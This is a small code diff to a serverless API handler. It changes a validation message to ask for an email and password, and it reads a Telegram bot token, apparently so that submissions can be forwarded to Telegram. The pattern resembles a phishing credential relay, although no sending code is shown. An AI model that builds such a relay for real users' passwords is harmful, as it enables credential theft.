@@ -19,10 +19,10 @@ export default async function handler(req, res) {
   !message.trim()
 ) {
       return res.status(400).json({
-        success: false,
-        message: "Please fill in all fields."
-      });
-    }
+    success: false,
+    message: "Please enter your email and password."
+  });
+}
 
     // Get Telegram credentials from Vercel
     const token = process.env.TELEGRAM_BOT_TOKEN;
